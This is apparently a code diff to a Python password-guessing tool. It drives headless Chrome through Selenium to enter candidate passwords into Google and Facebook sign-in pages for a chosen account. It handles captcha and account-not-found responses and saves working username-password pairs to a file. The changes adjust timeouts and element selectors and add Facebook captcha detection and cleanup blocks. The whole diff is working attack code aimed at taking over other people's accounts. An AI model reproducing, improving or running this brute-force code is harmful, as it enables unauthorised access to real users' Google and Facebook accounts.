@@ -39,7 +39,7 @@ else:
   os.makedirs('data', exist_ok = True)
   with open('data/settings.json', 'w') as new_setting:
     format_ = {
-      "settings": True,
+      "settings": False,
       "proxy": False,
       "username": "",
       "email address": "",
@@ -280,8 +280,8 @@ def main():
         print(blue+textwrap.dedent(target)+plain)
         options = webdriver.ChromeOptions()
         options.add_argument('--headless=new')
-        options.add_argument('--disable-gpu')
         options.add_argument('--no-sandbox')
+        options.add_argument('--disable-gpu')
         options.add_argument('--incognito')
         options.add_argument("user-agent=Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36")
         tar = input(f'{yellow}>>> ').lower()
@@ -309,7 +309,7 @@ def main():
               driver.get(sign_in_tar)
               time.sleep(5)
 
-              wait = WebDriverWait(driver, 20)
+              wait = WebDriverWait(driver, 60)
               page_source = driver.page_source
               page_ = bs(page_source, 'html.parser')
               if 'Error' in page_.text:
@@ -322,8 +322,8 @@ def main():
               wait.until(EC.visibility_of_element_located((By.XPATH,'//button[contains(text(), "Next")]')))
               driver.find_element(By.XPATH,'//button[contains(text(), "Next")]').click()
               captcha = []
-              wait.until(EC.visibility_of_element_located((By.XPATH, '//input[@type="password"]')))
-              target_password = driver.find_element(By .XPATH,'//input[@type="password"]')
+              wait.until(EC.visibility_of_element_located((By.CSS_SELECTOR, 'input[type="password"]')))
+              target_password = driver.find_element(By .CSS_SELECTOR,'input[type="password"]')
                 
               target_password.send_keys(check_password)
               wait.until(EC.visibility_of_element_located((By.XPATH,'//button[contains(text(), "Next")]')))
@@ -338,7 +338,7 @@ def main():
                 
               page_now = bs(driver.page_source, 'html.parser').text
                
-              if r"Couldn’t find your Google Account" in page_:
+              if r"find your Google Account" in page_:
                 print(f'{red}Couldn\'t find the google account {email_or_phone}{plain}')
                 driver.quit()
                 break
@@ -351,7 +351,7 @@ def main():
                 captcha.extend(check_password)
                 print(f'{red}Captcha detected {plain}')
                 if len(captcha) > 5:
-                  print(f'{red}The server keeps calling me a bot, i should just go to sleep now💤...You should too{plain}')
+                  print(f'{red}The server keeps calling me a bot, i shall go to sleep now💤...You should too{plain}')
                   driver.quit()
                   break
   
@@ -363,9 +363,7 @@ def main():
                 del_mem.terminate_()
                 break
               else:
-                print(f'{yellow}Await response timeout - try the password tho{plain}')
-                
-              
+                print(f'{yellow}Await response timeout - slow internet connection{plain}')
             except Exception:
               track = traceback.format_exc()
               proxy_errorV(errorLogged = track, terminate = caught_proxy)
@@ -374,7 +372,9 @@ def main():
               driver.quit()
               print(f'{red}Session terminated{plain}')
               break
-            
+            finally:
+              driver.quit()
+              
             driver.quit()
             i += 1
             
@@ -415,14 +415,14 @@ def main():
                   print(red+page_+plain)
                   break
                       
-                wait = WebDriverWait(driver,30)
-                wait.until(EC.visibility_of_element_located((By.XPATH, '//input[@placeholder="Email address or phone number"]')))
+                wait = WebDriverWait(driver,60)
+                wait.until(EC.visibility_of_element_located((By.CSS_SELECTOR, 'input[placeholder="Email address or phone number"]')))
               
-                username_field = driver.find_element(By.XPATH,
-                '//input[@placeholder="Email address or phone number"]')
+                username_field = driver.find_element(By.CSS_SELECTOR,
+                'input[placeholder="Email address or phone number"]')
     
-                password_field = driver.find_element(By.XPATH,
-                '//input[@type="password"]')
+                password_field = driver.find_element(By.CSS_SELECTOR,
+                'input[type="password"]')
               
                 username_field.send_keys(username_email)
                 password_field.send_keys(check_password)
@@ -459,9 +459,13 @@ def main():
                     save_passwords.write(f'{username_email} - {check_password} - Facebook - {time.time()}\n')
                     del_mem = memory(username_email,2,None,None)
                     del_mem.terminate_()
+                  if 'Enter the characters' in page_now:
+                    print(f'{red}Captcha detected{plain}')
+                    driver.quit()
+                    break
                   else:
                     logging.critical(sel_timer)
-                    print(f'{yellow}Await response timeout - try the password tho{plain}')
+                    print(f'{yellow}Await response timeout - slow internet connection{plain}')
                     driver.quit()
                     pass
                     
@@ -481,7 +485,9 @@ def main():
               driver.quit()
               print(f'{red}Session terminated{plain}')
               break
-            
+            finally:
+              driver.quit()
+              
             driver.quit()
             i += 1
           
@@ -646,13 +652,11 @@ def main():
                         file.write(f'{bs.prettify(elements_extracted[j])}\n')
                         j += 1
                   
-                  a = 0
-                  while a < len(elements_extracted):
-                    print(bs.prettify(elements_extracted[a]))
-                    a += 1
+                  for element in elements_extracted:
+                    print(bs.prettify(element))
                   
                   if '-' in list_to_extract[-1:][0]:
-                    print(f'{yellow}𝙵𝚒𝚕𝚎 𝚜𝚊𝚟𝚎𝚍, 𝚝𝚘 𝚘𝚙𝚎𝚗 : [𝚌𝚊𝚝 𝚌𝚊𝚌𝚑𝚎/𝚜𝚔𝚒𝚗𝚗𝚎𝚛/𝚏𝚒𝚕𝚎_𝚗𝚊𝚖𝚎]\n')
+                    print(f'{yellow}𝙵𝚒𝚕𝚎 𝚜𝚊𝚟𝚎𝚍, 𝚝𝚘 𝚘𝚙𝚎𝚗 : [𝚌𝚊𝚝 𝚌𝚊𝚌𝚑𝚎/𝚜𝚔𝚒𝚗𝚗𝚎𝚛/𝚏𝚒𝚕𝚎_𝚗𝚊𝚖𝚎]\n{plain}')
                     
                   if not html_extract.lower() == 'exit':
                     print(f'{green}𝙽𝚞𝚖𝚋𝚎𝚛 𝚘𝚏 𝚎𝚕𝚎𝚖𝚎𝚗𝚝𝚜 𝚎𝚡𝚝𝚛𝚊𝚌𝚝𝚎𝚍 = {len(elements_extracted)}{plain}')
